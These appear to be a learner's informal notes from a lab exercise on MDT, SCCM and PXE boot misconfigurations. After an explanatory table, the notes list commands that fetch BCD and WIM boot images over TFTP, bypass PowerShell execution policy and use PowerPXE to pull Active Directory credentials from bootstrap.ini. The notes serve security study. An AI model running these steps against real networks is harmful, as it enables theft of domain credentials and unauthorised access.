This lecture summarizes how **Microsoft Deployment Toolkit (MDT)** and **System Center Configuration Manager (SCCM)** are used by large organizations for infrastructure management and explains how **misconfigurations** in these tools, specifically with **PXE Boot**, can be exploited to gain unauthorized access and retrieve Active Directory (AD) credential


| **Tool/Concept**                               | **Purpose in Enterprise**                                                                                                            | **Security Implication**                                                                                             |
| ---------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------- |
| **MDT** (Microsoft Deployment Toolkit)         | Automates the **initial deployment** of Microsoft Operating Systems (OS) and custom images (with pre-installed software/updates).    | Can be exploited via its boot images/configuration files to inject backdoors or extract credentials.                 |
| **SCCM** (System Center Configuration Manager) | Manages **patching and updates** for all installed Microsoft applications and OSes across the estate (**post-deployment**).          | Centralized management makes it a high-value target for attackers.                                                   |
| **PXE Boot** (Preboot Execution Environment)   | Allows new devices to load and install the OS **directly over a network connection**, often managed by MDT and integrated with DHCP. | The boot image retrieval process can be intercepted and the image itself (WIM file) can be analyzed for credentials. |
| **WIM File** (Windows Imaging Format)          | The **bootable image** used by MDT/SCCM for OS installation.                                                                         | Contains configuration files, like `bootstrap.ini`, which may store AD service account credentials in plain text.    |

->> basically looking fro the AD credentials
->> from BCD boot conf deployment 
->that shows you the Wim
->> in the Wim u loog for boostrap.ini that hass master password init 


:>sign in through ssh
:>make a dir with username
:>copy pxe dir to the made dir
note name is already known from domain site x64 ... must be complete 
cmd:> tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd

run script

cmd:>powershell -executionpolicy bypass 
cmd:>
PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1
PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile



get wim
cmd:> tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim



cmd:>Get-FindCredentials -WimFile pxeboot.wim